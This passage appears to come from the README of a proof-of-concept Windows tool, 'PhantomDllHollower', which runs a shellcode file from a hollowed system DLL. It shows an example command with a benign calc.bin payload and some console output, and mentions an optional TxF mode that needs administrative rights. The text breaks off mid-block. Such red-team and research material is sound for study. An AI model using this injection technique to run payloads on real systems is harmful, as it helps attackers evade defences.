To use this PoC, specifies shellcode file you want to execute as follows:

```
C:\Tools>powershell -c Get-Process calc*

C:\Tools>PhantomDllHollower.exe -p calc.bin

[>] Trying to read payload from C:\Tools\calc.bin.
[+] Payload is read successfully (276 bytes).
[>] Searching target module file from C:\Windows\system32.

If you want to use TxF technique, set `-t` flag as well as shellcode file path.
This option requires administrative privilege:

```
